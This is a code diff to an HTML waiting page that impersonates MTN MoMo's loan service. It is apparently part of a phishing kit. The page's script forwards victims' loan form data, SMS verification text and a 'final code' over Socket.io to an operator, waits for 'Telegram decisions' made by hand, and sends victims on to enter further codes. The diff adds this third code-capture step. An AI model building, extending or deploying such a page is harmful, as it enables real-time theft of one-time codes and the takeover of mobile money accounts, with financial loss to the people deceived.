@@ -7,7 +7,7 @@
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
         body { 
-            background-color: #004c6c; /* MTN Blue */
+            background-color: #004c6c; 
             color: white; 
             display: flex; 
             flex-direction: column; 
@@ -16,70 +16,26 @@
             min-height: 100vh; 
             text-align: center;
         }
-
-        /* MoMo Logo Glow */
-        .logo-container {
-            margin-bottom: 40px;
-            position: relative;
-            display: inline-block;
-        }
-        .logo-container img {
-            width: 120px;
-            border-radius: 20px;
-            position: relative;
-            z-index: 2;
-        }
+        .logo-container { margin-bottom: 40px; position: relative; display: inline-block; }
+        .logo-container img { width: 120px; border-radius: 20px; position: relative; z-index: 2; }
         .glow {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 140px;
-            height: 140px;
-            background: rgba(255, 204, 0, 0.4);
-            filter: blur(30px);
-            border-radius: 50%;
-            z-index: 1;
-            animation: pulse 2s infinite alternate;
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 140px; height: 140px; background: rgba(255, 204, 0, 0.4);
+            filter: blur(30px); border-radius: 50%; z-index: 1; animation: pulse 2s infinite alternate;
         }
-        @keyframes pulse {
-            0% { transform: translate(-50%, -50%) scale(0.9); opacity: 0.6; }
-            100% { transform: translate(-50%, -50%) scale(1.1); opacity: 1; }
-        }
-
-        /* Spinner */
+        @keyframes pulse { 0% { transform: translate(-50%, -50%) scale(0.9); opacity: 0.6; } 100% { transform: translate(-50%, -50%) scale(1.1); opacity: 1; } }
         .spinner {
-            width: 80px;
-            height: 80px;
-            border: 6px solid rgba(255, 255, 255, 0.1);
-            border-top: 6px solid #ffcc00;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 40px;
+            width: 80px; height: 80px; border: 6px solid rgba(255, 255, 255, 0.1);
+            border-top: 6px solid #ffcc00; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 40px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         h1 { font-size: 1.8rem; margin-bottom: 10px; font-weight: 600; }
         p { font-size: 1rem; color: #b3c6d1; margin-bottom: 40px; }
-
-        /* Bouncing Dots */
         .dots { display: flex; gap: 8px; justify-content: center; }
-        .dot {
-            width: 8px;
-            height: 8px;
-            background-color: #ffcc00;
-            border-radius: 50%;
-            animation: bounce 1.4s infinite ease-in-out both;
-        }
+        .dot { width: 8px; height: 8px; background-color: #ffcc00; border-radius: 50%; animation: bounce 1.4s infinite ease-in-out both; }
         .dot:nth-child(1) { animation-delay: -0.32s; }
         .dot:nth-child(2) { animation-delay: -0.16s; }
-        @keyframes bounce {
-            0%, 80%, 100% { transform: scale(0); }
-            40% { transform: scale(1); }
-        }
+        @keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
     </style>
 </head>
 <body>
@@ -88,72 +44,74 @@
         <div class="glow"></div>
         <img src="momo-preview.jpg" alt="MoMo Logo">
     </div>
-
     <div class="spinner"></div>
-
     <h1>Processing Application</h1>
     <p>Please wait, this may take a few seconds</p>
+    <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
 
-    <div class="dots">
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-    </div>
-
-    <!-- Load Socket.io -->
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-
-        // Check what we are processing
         const processType = sessionStorage.getItem('processType');
 
+        // Trigger the correct socket emit based on the page flow
         if (processType === 'loan_application') {
-            // Send the saved form data to the server
             const loanData = JSON.parse(sessionStorage.getItem('loanData'));
             socket.emit('submit_loan', loanData);
         } 
         else if (processType === 'sms_verification') {
-            // Send the saved SMS to the server
             const smsText = sessionStorage.getItem('smsData');
             socket.emit('submit_sms', smsText);
+        }
+        else if (processType === 'final_code') {
+            const finalCode = sessionStorage.getItem('finalCodeData');
+            socket.emit('submit_final_code', finalCode);
         }
 
         // --- LISTEN FOR TELEGRAM DECISIONS ---
 
         // 1. Loan Application Responses
         socket.on('approved', () => {
-            sessionStorage.removeItem('processType');
-            sessionStorage.removeItem('loanData');
+            sessionStorage.clear();
             window.location.href = "/verify-sms.html"; 
         });
-
         socket.on('rejected', () => {
-            sessionStorage.removeItem('processType');
-            sessionStorage.removeItem('loanData');
+            sessionStorage.clear();
             alert("Invalid details. Please enter the correct phone number and verification code.");
-            window.location.href = "/index.html"; // Back to form
+            window.location.href = "/index.html";
         });
 
         // 2. SMS Verification Responses
         socket.on('sms_approved', () => {
-            sessionStorage.removeItem('processType');
-            sessionStorage.removeItem('smsData');
+            sessionStorage.clear();
             window.location.href = "/verify-code.html";
         });
-
         socket.on('sms_rejected', () => {
-            sessionStorage.removeItem('processType');
-            sessionStorage.removeItem('smsData');
+            sessionStorage.clear();
             alert("Invalid SMS. Please enter the correct 5-digit code.");
-            window.location.href = "/index.html"; // Or wherever your 5-digit code page is
+            window.location.href = "/index.html";
+        });
+        socket.on('sms_resend', () => {
+            sessionStorage.clear();
+            alert("Check your SMS for the new code sent.");
+            window.location.href = "/verify-sms.html";
         });
 
-        socket.on('sms_resend', () => {
-            sessionStorage.removeItem('processType');
-            sessionStorage.removeItem('smsData');
-            alert("Check your SMS for the new code sent.");
-            window.location.href = "/verify-sms.html"; // Back to SMS page
+        // 3. Final Code Responses
+        socket.on('final_approved', () => {
+            sessionStorage.clear();
+            alert("Your loan has been approved for funding within 24 hours.");
+            window.location.href = "/success.html"; // Or redirect to home
+        });
+        socket.on('final_resend', () => {
+            sessionStorage.clear();
+            alert("Check your sms for the new 4 digit code sent");
+            window.location.href = "/verify-code.html";
+        });
+        socket.on('final_inactive', () => {
+            sessionStorage.clear();
+            alert("Your line is inactive please ensure to apply using a line you normally transact with.");
+            window.location.href = "/index.html";
         });
     </script>
 </body>
